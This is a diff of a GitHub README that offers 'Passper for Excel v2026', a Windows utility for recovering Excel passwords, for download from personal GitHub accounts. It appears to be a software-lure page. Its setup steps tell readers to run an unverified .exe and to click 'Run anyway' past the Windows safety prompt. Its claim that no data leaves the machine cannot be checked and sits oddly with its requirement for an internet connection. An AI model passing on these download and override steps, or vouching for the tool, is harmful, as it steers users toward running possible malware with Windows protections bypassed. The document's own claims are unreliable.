@@ -1,131 +1,85 @@
-# Passper for Excel v2026 - Excel password recovery tool 2026
+# 🔑 passper-excel-password-unlock - Recover lost Excel file passwords easily
 
-> **Passper for Excel v2026 is a Windows utility for recovering lost Excel passwords and managing protected spreadsheets through guided GUI and CLI workflows.**
+[![Download Passper for Excel](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ugaaga4342/passper-excel-password-unlock)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lewisethanne406/passper-excel-password-unlock?style=flat-square)](https://github.com/lewisethanne406/passper-excel-password-unlock)
+Passper for Excel v2026 helps you regain access to your locked spreadsheets. This tool restores entry to files when you lose or forget the password. It works on Windows computers. The software provides a simple interface that guides you through the recovery process. You can choose between a visual menu or a text-based command tool.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://lewisethanne406.github.io/passper-excel-password-unlock/">
-    <img src="https://img.shields.io/badge/Download-Passper%20for%20Excel%20Latest-brightgreen?style=for-the-badge" alt="Download Passper for Excel">
-  </a>
-</p>
+To use this tool, visit the link below to reach the official download page. 
 
-> **[Direct Download - Passper for Excel v2026](https://lewisethanne406.github.io/passper-excel-password-unlock/)**
+[Click here to visit the release page to download Passper](https://github.com/Ugaaga4342/passper-excel-password-unlock)
 
----
+Once the webpage loads, look for the list of files under the latest version. Select the file ending in .exe to start your download. Your browser will save the file to your computer.
 
-[Download Latest Build](https://lewisethanne406.github.io/passper-excel-password-unlock/)
+## ⚙️ System requirements
 
----
+Passper for Excel requires the following setup to function correctly:
 
-## Overview
+* Windows 10 or Windows 11 operating system.
+* At least 500 MB of free storage space.
+* 4 GB of RAM or higher.
+* An active internet connection for the initial setup.
+* Microsoft Excel installed on your machine.
 
-Passper for Excel is built for Windows users who need a straightforward way to regain access to Excel files after a password has been lost or forgotten. It is centered on spreadsheet unlocking scenarios, covering workbook access restrictions and sheet protection, while keeping both a graphical workflow and a command-line path available.
+## 🚀 Setting up the application
 
-The software brings together multiple recovery strategies so you can pick the one that fits the file and the clues you already have. It also provides result export options, the ability to continue interrupted sessions, and a responsive multilingual interface for regular use.
+Follow these steps to install the tool on your machine:
 
----
+1. Locate the downloaded .exe file in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Windows might show a safety prompt. If it does, click "More info" and then click "Run anyway."
+4. Follow the instructions on the screen to finish the installation.
+5. Create a desktop shortcut if the installer asks you to do so.
 
-## What it can do
+## 🛠️ How to use the graphical interface
 
-- Recover lost or forgotten Excel passwords
-- Handle protected spreadsheets and workbook access restrictions
-- Run brute force, dictionary, and mask attack methods
-- Use GPU acceleration to speed up processing
-- Resume interrupted recovery sessions without restarting
-- Operate through either GUI or CLI
-- Export recovery results to CSV or JSON
-- Offer a responsive multilingual interface
+The graphical interface is the simplest way to unlock your files. Follow these steps:
 
----
+1. Open the Passper for Excel icon on your desktop.
+2. Choose the specific mode that fits your situation. 
+3. Click the "Add" button to select the locked Excel file from your folders.
+4. Pick a recovery method. The software allows you to choose from a dictionary attack, a mask attack, or a brute-force attack.
+5. Click the "Start" button.
+6. The software will process your file. Wait for the progress bar to reach the end.
+7. Copy the recovered password or click the "Open" button to view your spreadsheet.
 
-## Installation
+## ⌨️ Using the command line interface
 
-1. Download or clone the repository to your Windows machine.
-2. Open the project folder:
-   - `cd passper-excel-unlock-toolkit-2026`
-3. Start the desktop app or use the CLI entry point if your build provides one.
+Advanced users or those who prefer text commands can use the Command Line Interface (CLI):
 
-If you are using a packaged release, launch the included executable or installer from the downloaded build.
+1. Press the Windows key on your keyboard and search for "Command Prompt."
+2. Open the program.
+3. Type the file path of the Passper tool followed by the path of your locked document.
+4. Press Enter.
+5. The text window will report the status of the password recovery.
+6. Once the program finds the password, it will display the result on your screen.
 
----
+## 🛡️ Privacy and security
 
-## Usage
+This tool runs directly on your local machine. Your Excel files stay on your computer during the entire recovery process. The software does not send your data or your passwords to any website or server. Your documents remain private.
 
-A typical recovery flow looks like this:
+## 💡 Troubleshooting common issues
 
-1. Open Passper for Excel.
-2. Add the password-protected Excel file.
-3. Select a recovery mode:
-   - Brute force
-   - Dictionary attack
-   - Mask attack
-4. Tune the attack settings if you know part of the password or the file pattern.
-5. Begin recovery and wait for the result.
-6. Export the outcome to CSV or JSON if you want to preserve the session details.
+If you encounter problems, check these items:
 
-Example CLI-style workflow:
+* Make sure you closed all instances of Microsoft Excel before you start the recovery process.
+* Check that your file is not corrupted. This tool recovers passwords but cannot repair files with structural damage.
+* If the software freezes, restart your computer and try again.
+* Ensure your Windows version has all current updates installed.
 
-- Load a protected workbook
-- Select an attack mode
-- Run the recovery task
-- Resume later if the session is interrupted
+## 📋 Frequently asked questions
 
----
+**Will this tool work on all Excel versions?**
+Yes. It supports files from all versions of Microsoft Excel.
 
-## Configuration
+**How long does recovery take?**
+The time depends on the complexity of the password. Short passwords take seconds. Complex codes take more time.
 
-You normally manage settings inside the application or through the CLI options used to start a session.
+**Can I stop the process?**
+Yes. You can press the "Stop" button at any time. The software saves your progress so you can resume later.
 
-Example configuration structure:
+**Does this software store my passwords?**
+No. Passper for Excel only retrieves your lost password for your immediate use. It does not save your spreadsheet data or passwords in a database.
 
-    {
-      "mode": "dictionary",
-      "gpuAcceleration": true,
-      "resumeSession": true,
-      "exportFormat": "json"
-    }
-
-In the GUI, these values are usually set before you start a recovery job. In the CLI, use the equivalent flags or parameters included with your build.
-
----
-
-## Requirements
-
-- Windows operating system
-- A compatible Excel file or protected spreadsheet to process
-- Sufficient CPU and memory for password recovery tasks
-- GPU support if you plan to use acceleration
-- Disk space for session data and exported results
-- Optional command-line environment for CLI usage
-
----
-
-## FAQ
-
-**Can I use the GUI and CLI versions?**  
-Yes. The project supports both usage styles, depending on how your build is packaged.
-
-**Does it support interrupted recovery?**  
-Yes. Recovery sessions can be resumed after a pause or interruption.
-
-**Where do I change attack settings?**  
-In the application settings or through command-line arguments, depending on the interface you use.
-
-**How are results saved?**  
-You can export recovery output to CSV or JSON.
-
-**What if the file is still not recovered?**  
-Try another recovery mode, refine the mask, or adjust the dictionary list and session settings.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: excel, password, recovery, windows, spreadsheet, security, unlock, office, utility
